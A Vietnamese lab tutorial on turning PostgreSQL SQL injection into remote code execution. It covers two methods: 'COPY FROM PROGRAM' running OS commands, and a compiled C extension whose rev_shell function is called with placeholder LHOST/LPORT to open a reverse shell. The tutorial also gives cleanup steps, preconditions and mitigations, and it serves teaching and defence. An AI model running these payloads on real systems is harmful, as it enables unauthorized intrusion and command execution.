# Command Execution trong PostgreSQL

> Nội dung này được viết lại từ phần **Command Execution** của tài liệu *13. Advanced SQL Injections.pdf*. Phần này mô tả 2 cách chạy lệnh thông qua PostgreSQL injection: **Method 1: COPY** và **Method 2: PostgreSQL Extensions**. Chỉ sử dụng trong môi trường lab/được cấp quyền.

---

## 1. Tổng quan

Trong phần **Command Execution**, tài liệu trình bày hai cách có thể dùng để chạy lệnh thông qua PostgreSQL injection:

1. **COPY**: lợi dụng khả năng `COPY ... FROM PROGRAM` để yêu cầu PostgreSQL chạy một chương trình hệ điều hành, sau đó lưu output vào bảng.
2. **PostgreSQL Extensions**: tạo hoặc load một thư viện mở rộng, ví dụ C extension, rồi gọi function trong PostgreSQL để đạt reverse shell.

Về mặt chuỗi khai thác trong lab, có thể mô tả như sau:

```text
SQL Injection
→ chạy được câu SQL tùy ý hoặc stacked query
→ gọi primitive nguy hiểm của PostgreSQL
→ thực thi lệnh / load native code
→ RCE
```

---

## 2. Method 1: `COPY FROM PROGRAM`

### 2.1. Ý tưởng

PostgreSQL có câu lệnh `COPY` dùng để nhập/xuất dữ liệu. Ngoài việc đọc/ghi file, `COPY` còn có thể lấy dữ liệu từ output của một chương trình thông qua cú pháp `COPY ... FROM PROGRAM`.

Điều này có nghĩa là nếu attacker có thể điều khiển câu SQL đủ mạnh, PostgreSQL có thể được yêu cầu chạy một lệnh hệ điều hành dưới quyền user đang chạy PostgreSQL, thường là user `postgres`. Output của lệnh được đưa vào một bảng, sau đó attacker có thể đọc lại bằng `SELECT`.

### 2.2. Chuỗi khai thác trong lab

```text
SQLi
→ stacked query hoặc query tùy ý
→ CREATE TABLE tạm để chứa output
→ COPY tmp FROM PROGRAM '<command>'
→ SELECT output từ bảng
→ chứng minh command execution
```

Ví dụ minh họa theo tài liệu:

```sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
```

Kết quả mong đợi là output của lệnh `id` được lưu trong bảng `tmp`, chứng minh PostgreSQL đã chạy command trên hệ điều hành.

Sau khi demo xong nên dọn dẹp:

```sql
DROP TABLE tmp;
```

### 2.3. Điều kiện để thành RCE

Để dùng được `COPY FROM PROGRAM` cho RCE, điều kiện quan trọng nhất là **quyền của database user**.

Database user phải thỏa một trong hai điều kiện:

```text
- là PostgreSQL superuser; hoặc
- có role pg_execute_server_program
```

Nếu user kết nối database chỉ là user thường và không có role phù hợp, `COPY FROM PROGRAM` sẽ bị chặn.

### 2.4. Vị trí trong 4 hướng của lab

Method này thuộc:

```text
Hướng 3: SQLi → DBMS command execution → RCE
```

Đây là hướng trực tiếp nhất vì không cần upload file `.so`, không cần ghi webshell, cũng không cần chiếm admin panel. PostgreSQL tự chạy command thông qua tính năng `COPY FROM PROGRAM`.

### 2.5. Điểm cần phân tích khi viết báo cáo

- SQLi ban đầu nằm ở endpoint nào?
- SQLi có cho phép stacked query không?
- Database user có quyền gì?
- Vì sao `COPY FROM PROGRAM` có thể chạy lệnh OS?
- Lệnh chạy dưới quyền user nào?
- Cách giảm thiểu: không dùng DB superuser cho web app, không cấp `pg_execute_server_program`, tách quyền DB theo nguyên tắc least privilege.

---

## 3. Method 2: PostgreSQL Extensions

### 3.1. Ý tưởng

PostgreSQL hỗ trợ cơ chế **extension** để mở rộng chức năng của database. Extension có thể là thư viện được load vào PostgreSQL. Trong tài liệu, ví dụ được dùng là một custom C extension có function `rev_shell`, khi được gọi sẽ tạo reverse shell dưới quyền user `postgres`.

Chuỗi tổng quát:

```text
SQLi
→ upload hoặc ghi file shared library `.so` lên server
→ CREATE FUNCTION để ánh xạ function PostgreSQL tới hàm trong `.so`
→ SELECT gọi function đó
→ reverse shell
→ RCE
```

### 3.2. Thành phần chính

Trong tài liệu, extension được biên dịch thành file:

```text
pg_rev_shell.so
```

Sau đó PostgreSQL load function từ thư viện này bằng `CREATE FUNCTION`.

Ví dụ câu lệnh theo tài liệu:

```sql
CREATE FUNCTION rev_shell(text, integer)
RETURNS integer
AS '/tmp/pg_rev_shell', 'rev_shell'
LANGUAGE C STRICT;
```

Sau khi function đã được tạo, gọi function:

```sql
SELECT rev_shell('<LHOST>', <LPORT>);
```

Khi gọi function, database có thể bị treo hoặc mất kết nối tạm thời vì function đang giữ phiên reverse shell. Listener phía attacker/lab sẽ nhận shell với quyền của user chạy PostgreSQL.

### 3.3. Các bước triển khai trong lab

#### Bước 1: Chuẩn bị C extension

Tài liệu dùng C extension cho PostgreSQL. Extension cần được biên dịch đúng với version PostgreSQL đích. Trong ví dụ, PostgreSQL target là version 13.9, vì vậy cần gói development tương ứng.

Ví dụ lệnh cài gói dev và biên dịch:

```bash
sudo apt install postgresql-server-dev-13
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```

Điểm cần chú ý:

```text
- Extension phải tương thích với major version của PostgreSQL.
- File C extension cần có PG_MODULE_MAGIC để PostgreSQL kiểm tra tính tương thích.
```

#### Bước 2: Đưa file `.so` lên server

Tài liệu nói file `.so` có thể được upload bằng nhiều cách, ví dụ:

```text
- COPY
- Large Objects
```

Điều quan trọng là sau khi upload, attacker/lab phải biết chính xác path của file `.so` trên server, ví dụ:

```text
/tmp/pg_rev_shell.so
```

Trong chuỗi lab đã bàn, bước này có thể dùng PostgreSQL Large Object:

```text
lo_create()
→ ghi nội dung `.so` vào pg_largeobject
→ lo_export() ghi `.so` ra filesystem
```

#### Bước 3: Tạo function trong PostgreSQL

Khi đã có file `.so` trên server, tạo function để PostgreSQL load hàm native từ thư viện:

```sql
CREATE FUNCTION rev_shell(text, integer)
RETURNS integer
AS '/tmp/pg_rev_shell', 'rev_shell'
LANGUAGE C STRICT;
```

Lưu ý: trong `CREATE FUNCTION`, đường dẫn thường bỏ phần đuôi `.so`.

#### Bước 4: Gọi function để kích hoạt reverse shell

```sql
SELECT rev_shell('<LHOST>', <LPORT>);
```

Nếu listener đang mở, lab sẽ nhận reverse shell với quyền của user PostgreSQL, thường là:

```text
postgres
```

#### Bước 5: Dọn dẹp

Sau khi kết thúc demo, cần xóa function và large object đã tạo:

```sql
DROP FUNCTION rev_shell;
SELECT lo_unlink(<loid>);
```

---

## 4. Điều kiện để Method 2 thành RCE

Method PostgreSQL Extension yêu cầu nhiều điều kiện hơn `COPY FROM PROGRAM`:

```text
1. Có SQL Injection đủ mạnh để chạy câu SQL tùy ý hoặc stacked query.
2. Có cách đưa file `.so` lên server, ví dụ Large Objects hoặc COPY.
3. Biết được đường dẫn chính xác của file `.so` trên server.
4. File `.so` được biên dịch đúng với version PostgreSQL đích.
5. Database user có quyền tạo function hoặc quyền cao hơn.
6. PostgreSQL cho phép dùng language C, vì C là untrusted language với non-superuser.
7. Môi trường mạng cho phép reverse shell kết nối ra ngoài, nếu demo bằng reverse shell.
```

Nếu thiếu một trong các điều kiện trên, chuỗi khai thác có thể chỉ dừng ở mức ghi file hoặc tạo object, chưa đạt RCE.

---

## 5. Vị trí của Method 2 trong 4 hướng của lab

Method này thuộc:

```text
Hướng 2: SQLi → load extension/native library → RCE
```

Tuy nhiên trong biến thể cụ thể của tài liệu, nó có thêm bước trung gian của hướng ghi file:

```text
SQLi
→ Large Object
→ ghi pg_rev_shell.so ra /tmp
→ CREATE FUNCTION LANGUAGE C
→ SELECT rev_shell(...)
→ Reverse Shell
→ RCE
```

Vì vậy có thể trình bày trong báo cáo như sau:

> Method PostgreSQL Extension thuộc hướng load extension/native library. Trong case study này, Large Object chỉ đóng vai trò hỗ trợ upload/ghi file `.so`; điểm tạo ra RCE thực sự là việc PostgreSQL load thư viện C và gọi function native.

---

## 6. So sánh nhanh hai method

| Tiêu chí | Method 1: COPY | Method 2: PostgreSQL Extension |
|---|---|---|
| Bản chất | Chạy OS command trực tiếp | Load thư viện native rồi gọi function |
| Chuỗi khai thác | SQLi → `COPY FROM PROGRAM` → command output | SQLi → upload `.so` → `CREATE FUNCTION` → reverse shell |
| Mức độ phức tạp | Thấp hơn | Cao hơn |
| Có cần ghi file `.so` không? | Không | Có |
| Có cần biên dịch code không? | Không | Có |
| Quyền cần thiết | `pg_execute_server_program` hoặc superuser | superuser hoặc quyền tạo function + điều kiện language C |
| Kết quả demo | Output command trong bảng | Reverse shell dưới quyền `postgres` |

---

## 7. Cách đưa vào web lab một trang

Trong web portal, có thể tách hai method thành hai module:

```text
/postgres-copy
/postgres-extension
```

### `/postgres-copy`

Mục tiêu:

```text
Chứng minh SQLi có thể gọi COPY FROM PROGRAM để chạy command OS.
```

Luồng demo:

```text
1. Người dùng nhập search parameter bị SQLi.
2. Payload tạo bảng tạm.
3. Payload gọi COPY FROM PROGRAM.
4. Payload SELECT lại output.
5. Trang web hiển thị kết quả command.
```

### `/postgres-extension`

Mục tiêu:

```text
Chứng minh SQLi có thể dẫn tới RCE thông qua load native extension.
```

Luồng demo:

```text
1. Người dùng khai thác SQLi.
2. Upload hoặc ghi file `.so` qua Large Object.
3. Export `.so` ra filesystem.
4. Tạo function C trong PostgreSQL.
5. Gọi function để nhận reverse shell.
6. Dọn dẹp function và large object.
```

---

## 8. Phòng chống

Các biện pháp phòng chống cần trình bày kèm phần Command Execution:

```text
1. Sửa SQLi bằng parameterized queries / prepared statements.
2. Không dùng database superuser cho web application.
3. Không cấp pg_execute_server_program nếu không thật sự cần.
4. Không cấp quyền đọc/ghi file server cho DB user nếu không cần.
5. Không cấp quyền tạo function/extension cho user ứng dụng.
6. Giới hạn quyền filesystem của process PostgreSQL.
7. Bật logging và giám sát các câu lệnh nguy hiểm như COPY FROM PROGRAM, CREATE FUNCTION, lo_export, pg_largeobject.
8. Chạy lab trong Docker/sandbox, không dùng trên hệ thống thật.
```

---

## 9. Kết luận

Phần **Command Execution** trong tài liệu cho thấy SQL Injection có thể vượt xa mức đọc dữ liệu. Khi SQLi kết hợp với các primitive nguy hiểm của PostgreSQL, attacker có thể đạt RCE theo hai hướng:

```text
Method 1: SQLi → COPY FROM PROGRAM → OS command execution
Method 2: SQLi → PostgreSQL Extension → native code execution / reverse shell
```

Trong báo cáo, nên nhấn mạnh rằng RCE phụ thuộc mạnh vào quyền của database user và cấu hình PostgreSQL. Nếu ứng dụng dùng parameterized query và database user tuân thủ nguyên tắc least privilege, chuỗi SQLi → RCE sẽ bị chặn ngay từ đầu hoặc bị giới hạn tác động.
